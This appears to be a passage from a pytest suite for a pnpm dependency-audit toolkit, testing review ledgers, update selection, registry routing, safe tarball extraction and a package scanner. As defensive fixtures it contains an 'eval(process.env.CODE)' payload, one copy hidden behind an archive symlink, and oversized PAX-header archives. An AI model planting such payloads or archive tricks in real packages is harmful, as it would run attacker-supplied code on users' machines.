    entry = {'artifact': ledger.identity(artifact), 'contextHash': artifact['contextHash'], 'criteria': ['safe_to_deploy'], 'decision': 'cleared', 'reviewer': {'kind': 'agent', 'id': 'fixture'}, 'reviewedAt': '2000-01-01T00:00:00Z', 'reason': 'Synthetic stale review', 'evidence': [{'path': evidence.relative_to(app).as_posix(), 'sha256': core().digest(evidence.read_bytes())}], 'findingFingerprints': [item['fingerprint']], 'findingEvidence': {item['fingerprint']: item['evidenceHash']}}
    ledger.append(app, entry)
    result = ledger.apply(app, [artifact], [item], new_ids={artifact['id']})
    assert result['unvetted'] == [artifact['id']]
    assert item['effectiveDecision'] == 'active'
    entry.pop('id', None)
    entry['reviewedAt'] = core().utcnow()
    entry['reason'] = 'Synthetic fresh review but a different importer context'
    entry['contextHash'] = 'other-context'
    ledger.append(app, entry)
    result = ledger.apply(app, [artifact], [item], new_ids={artifact['id']})
    assert result['unvetted'] == [artifact['id']]
    assert item['effectiveDecision'] == 'active'


def update_module():
    spec = importlib.util.spec_from_file_location('ts_dependency_update', SCRIPTS.parent.parent / 'deps-update/scripts/deps_update.py')
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_update_defaults_to_patch_and_checks_consumer_peers(tmp_path):
    app, fixtures, _ = project(tmp_path)
    graph = core().resolve_graph(app)
    module = update_module()
    class MetadataFixture:
        def metadata(self, artifact, packument=False):
            return {'versions': {'1.0.0': {}, '1.0.1': {'peerDependencies': {'react': '^19.0.0'}}, '1.2.0': {}, '2.0.0': {}, '3.0.0-beta.1': {}}}
    item = {'importer': '.', 'declaredName': 'demo', 'realName': 'demo', 'section': 'dependencies', 'specifier': '^1.0.0', 'locked': '1.0.0', 'wanted': '1.2.0', 'latest': '2.0.0', 'peers': {}, 'artifactId': graph['artifacts'][0]['id'], 'snapshot': 'demo@1.0.0'}
    chosen = module.choose([item], [], MetadataFixture(), graph)
    assert chosen[0]['candidate'] == '1.0.1'
    assert module.check_candidate_peers(chosen, graph)[0]['peer'] == 'react'
    assert module.group_for({'realName': 'react', 'importer': 'apps/web'}) != module.group_for({'realName': 'react', 'importer': 'apps/mobile'})
    chosen = module.choose([item], ['demo@2.0.0'], MetadataFixture(), graph)
    assert chosen[0]['candidate'] == '2.0.0'
    assert chosen[0]['explicitRequirementEdit']


def test_update_prepares_only_disabled_scripts_and_preserves_user_edits(tmp_path, monkeypatch):
    app, _, _ = project(tmp_path)
    module = update_module()
    manifest = json.loads((app / 'package.json').read_text())
    manifest['description'] = 'preexisting user change'
    (app / 'package.json').write_text(json.dumps(manifest))
    selected = [{'importer': '.', 'section': 'dependencies', 'declaredName': 'demo', 'candidate': '1.0.1', 'specifier': '^1.0.0', 'realName': 'demo'}]
    called = []
    def fake_run(command, **kwargs):
        called.append(command)
        return subprocess.CompletedProcess(command, 0, '', '')
    monkeypatch.setattr(module.subprocess, 'run', fake_run)
    report = {'commands': []}
    out = app / '.claude/deps-audit/runs/synthetic-update'
    assert module.execute(app, selected, report, out, prepare_only=True) == 0
    assert called == [['pnpm', 'install', '--lockfile-only', '--ignore-scripts', '--ignore-pnpmfile']]
    assert json.loads((app / 'package.json').read_text())['description'] == 'preexisting user change'
    assert json.loads((app / 'package.json').read_text())['dependencies']['demo'] == '1.0.1'
    assert json.loads((out / 'before/package.json').read_text())['dependencies']['demo'] == '^1.0.0'


def test_catalog_update_changes_shared_requirement_preserving_protocol(tmp_path, monkeypatch):
    app, _, lock = project(tmp_path)
    (app / 'pnpm-workspace.yaml').write_text('packages: []\ncatalog:\n  demo: ^1.0.0\n')
    (app / 'package.json').write_text(json.dumps({'name': 'app', 'dependencies': {'demo': 'catalog:'}}))
    lock['importers']['.']['dependencies']['demo']['specifier'] = 'catalog:'
    (app / 'pnpm-lock.yaml').write_text(yaml.safe_dump(lock))
    graph = core().resolve_graph(app)
    module = update_module()
    class MetadataFixture:
        def metadata(self, artifact, packument=False):
            return {'versions': {'1.0.0': {}, '1.0.1': {}}}
    item = {'importer': '.', 'declaredName': 'demo', 'realName': 'demo', 'section': 'dependencies', 'specifier': 'catalog:', 'locked': '1.0.0', 'wanted': '1.0.1', 'latest': '1.0.1', 'peers': {}, 'artifactId': graph['artifacts'][0]['id'], 'snapshot': 'demo@1.0.0'}
    selected = module.choose([item], [], MetadataFixture(), graph)
    monkeypatch.setattr(module.subprocess, 'run', lambda command, **kwargs: subprocess.CompletedProcess(command, 0, '', ''))
    module.execute(app, selected, {'commands': []}, app / '.claude/deps-audit/runs/catalog-test', prepare_only=True)
    assert yaml.safe_load((app / 'pnpm-workspace.yaml').read_text())['catalog']['demo'] == '1.0.1'
    assert json.loads((app / 'package.json').read_text())['dependencies']['demo'] == 'catalog:'


def test_environment_registry_routing_changes_gate_identity(tmp_path, monkeypatch):
    app, _, _ = project(tmp_path)
    before = core().input_hashes(app)
    monkeypatch.setenv('npm_config_registry', 'https://private.example.invalid/npm/')
    graph = core().resolve_graph(app)
    assert graph['artifacts'][0]['source'] == 'https://private.example.invalid/npm/'
    assert core().input_hashes(app) != before


def test_catalog_rejects_changed_constraint_for_existing_resolution(tmp_path):
    app, _, lock = project(tmp_path)
    (app / 'package.json').write_text(json.dumps({'name': 'app', 'dependencies': {'demo': 'catalog:'}}))
    (app / 'pnpm-workspace.yaml').write_text('catalog:\n  demo: ^2.0.0\n')
    lock['importers']['.']['dependencies']['demo']['specifier'] = 'catalog:'
    (app / 'pnpm-lock.yaml').write_text(yaml.safe_dump(lock))
    with pytest.raises(core().AuditError, match='catalog constraint'):
        core().resolve_graph(app)


@pytest.mark.parametrize('compression', ['w:', 'w:bz2', 'w:xz'])
def test_pax_headers_cannot_bypass_unpacked_budget(tmp_path, compression):
    body = io.BytesIO()
    with tarfile.open(fileobj=body, mode=compression, format=tarfile.PAX_FORMAT) as archive:
        member = tarfile.TarInfo('package/file')
        member.size = 1
        member.pax_headers = {'comment': 'x' * 20000}
        archive.addfile(member, io.BytesIO(b'a'))
    with pytest.raises(core().AuditError):
        core().safe_extract(body.getvalue(), tmp_path / 'out', unpacked_limit=1024)


def test_gate_hashes_review_evidence_and_pinned_imports(tmp_path):
    import ledger
    app = cached_project(tmp_path)
    artifact = core().resolve_graph(app)['artifacts'][0]
    evidence = app / '.claude/deps-audit/evidence/synthetic.json'
    core().atomic_json(evidence, {'synthetic': 'review evidence'})
    entry = {'artifact': ledger.identity(artifact), 'contextHash': artifact['contextHash'], 'criteria': ['safe_to_deploy'], 'decision': 'cleared', 'reviewer': {'kind': 'agent', 'id': 'synthetic-test'}, 'reviewedAt': core().utcnow(), 'reason': 'Synthetic gate evidence test', 'evidence': [{'path': evidence.relative_to(app).as_posix(), 'sha256': core().digest(evidence.read_bytes())}], 'findingFingerprints': []}
    ledger.append(app, entry)
    command = [sys.executable, str(SCRIPTS / 'deps_audit.py'), '--root', str(app), '--all', '--offline', '--json']
    proc = subprocess.run(command, capture_output=True, text=True)
    report = json.loads(proc.stdout)
    assert report['audit_passed'], proc.stdout
    assert core().gate_check(app)['allowed']
    evidence.write_text('{"changed":true}')
    assert not core().gate_check(app)['allowed']
    imported = app / '.claude/deps-audit/evidence/import.json'
    core().atomic_json(imported, ledger.empty())
    value, _ = ledger.load(app)
    value['policy']['block_on_unvetted'] = 'warn'
    value['imports'] = [{'path': imported.relative_to(app).as_posix(), 'sha256': core().digest(imported.read_bytes()), 'attribution': 'Synthetic import'}]
    ledger.write(app, value)
    proc = subprocess.run(command, capture_output=True, text=True)
    assert json.loads(proc.stdout)['audit_passed'], proc.stdout
    assert core().gate_check(app)['allowed']
    imported.write_text('{}')
    assert not core().gate_check(app)['allowed']


def test_project_token_overrides_home_token_without_network(tmp_path, monkeypatch):
    from transport import Fetcher
    app, _, _ = project(tmp_path)
    home = tmp_path / 'synthetic-home'
    home.mkdir()
    (home / '.npmrc').write_text('//registry.example.invalid/:_authToken=z-home-dummy\n')
    (app / '.npmrc').write_text('//registry.example.invalid/:_authToken=a-project-dummy\n')
    monkeypatch.setattr(Path, 'home', lambda: home)
    fetcher = Fetcher(app, offline=True)
    assert fetcher.token_for('https://registry.example.invalid/pkg') == 'a-project-dummy'
    assert fetcher.token_for('https://other.example.invalid/pkg') is None


def test_portable_ts_sibling_names_keep_executable_workflows(tmp_path):
    import os
    import shutil
    app, fixtures, _ = project(tmp_path)
    portable = tmp_path / 'portable/skills'
    for name in ('deps-audit', 'deps-vet', 'deps-update', 'docs-fetcher'):
        source = SCRIPTS.parent.parent / name
        target = portable / ('ts-' + name)
        shutil.copytree(source / 'scripts', target / 'scripts', ignore=shutil.ignore_patterns('__pycache__', 'node_modules'))
        if (source / 'priv').exists():
            shutil.copytree(source / 'priv', target / 'priv')
    env = {**os.environ, 'TS_AUDIT_TOOLING': str(ROOT)}
    proc = subprocess.run([sys.executable, str(portable / 'ts-deps-vet/scripts/deps_vet.py'), '--root', str(app), '--seed'], capture_output=True, text=True, env=env)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    proc = subprocess.run([sys.executable, str(portable / 'ts-deps-audit/scripts/deps_audit.py'), '--root', str(app), '--all', '--fixtures', str(fixtures), '--json'], capture_output=True, text=True, env=env)
    report = json.loads(proc.stdout)
    assert report['status'] == 'blocked'  # observed seed never approves the fixture
    assert report['coverage']['artifacts_scanned'] == 1
    proc = subprocess.run([sys.executable, str(portable / 'ts-docs-fetcher/scripts/docs_fetcher.py'), 'demo', '--root', str(app), '--fixtures', str(fixtures), '--query', 'value'], capture_output=True, text=True, env=env)
    assert proc.returncode == 0, proc.stdout + proc.stderr


@pytest.mark.parametrize('case', json.loads((SCRIPTS.parent / 'test-assets/synthetic/native-cases.json').read_text())['cases'], ids=lambda case: case['name'])
def test_packaged_synthetic_source_corpus(tmp_path, case):
    from analysis import scan_tree
    source = tmp_path / 'source'
    source.mkdir()
    (source / 'index.ts').write_text(case['source'])
    artifact = {'id': 'synthetic', 'name': 'synthetic-corpus', 'version': '0.0.0', 'source': 'synthetic', 'integrity': 'synthetic'}
    result = scan_tree(source, artifact)
    assert set(case['expectedRules']) == {f['rule_id'] for f in result['findings']}
    assert not result['parseFailures']


def test_extensionless_node_entrypoint_is_parsed(tmp_path):
    from analysis import scan_tree
    source = tmp_path / 'package'
    source.mkdir()
    (source / 'package.json').write_text(json.dumps({'name': 'synthetic', 'version': '0.0.0', 'bin': 'tool'}))
    (source / 'tool').write_text('eval(process.env.CODE);')
    artifact = {'id': 'synthetic', 'name': 'synthetic', 'version': '0.0.0', 'source': 'synthetic', 'integrity': 'synthetic'}
    result = scan_tree(source, artifact)
    assert any(f['rule_id'] == 'native:dynamic-eval' and f['severity'] == 'BLOCK' for f in result['findings'])


def test_internal_archive_link_records_validated_analysis_target(tmp_path):
    data = io.BytesIO()
    with tarfile.open(fileobj=data, mode='w:gz') as archive:
        item = tarfile.TarInfo('package/payload.txt')
        raw = b'eval(process.env.CODE);'
        item.size = len(raw)
        archive.addfile(item, io.BytesIO(raw))
        link = tarfile.TarInfo('package/index.js')
        link.type = tarfile.SYMTYPE
        link.linkname = 'payload.txt'
        archive.addfile(link)
    inventory = core().safe_extract(data.getvalue(), tmp_path / 'out')
    member = next(item for item in inventory if item['kind'] == 'link')
    assert member['resolvedTarget'] == 'package/payload.txt'
    assert not (tmp_path / 'out/package/index.js').exists()
